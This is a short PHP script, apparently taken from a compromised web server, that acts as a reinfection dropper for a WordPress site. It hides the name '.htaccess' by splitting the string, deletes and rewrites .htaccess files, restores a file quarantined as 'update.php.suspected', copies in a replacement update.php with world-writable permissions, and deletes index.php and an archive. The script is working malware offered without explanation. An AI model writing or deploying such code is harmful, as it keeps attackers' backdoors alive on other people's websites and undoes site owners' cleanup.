<?php

set_time_limit(0);
ignore_user_abort();

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists("../$ff")) chmod ("../$ff", 0777);
if (file_exists("../$ff")) unlink ("../$ff");		
/*
         $out = fopen("../$ff", "w");
         fwrite ($out, "RewriteEngine On 
         RewriteRule ^([A-Za-z0-9-]+).html$ update.php?date=$1 [L]");
         fclose($out);
*/

if (file_exists("../../$ff")) chmod ("../../$ff", 0777);
if (file_exists("../../$ff")) unlink ("../../$ff");	

		 	$outht = fopen("../../$ff", "w");
fwrite($outht, "# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>
 
# END WordPress");
fclose($outht);
	
	if (file_exists("../update.php.suspected")) rename("../update.php.suspected", "../update.php");
	if (!file_exists("../update.php")) copy ("update.txt", "../update.php");
	chmod("../update.php", 0777);
if (file_exists("../index.php")) unlink("../index.php");
if (file_exists("../d730d81e7o133a51c2bddc5c68874ce.zip")) unlink("../d730d81e7o133a51c2bddc5c68874ce.zip");


?>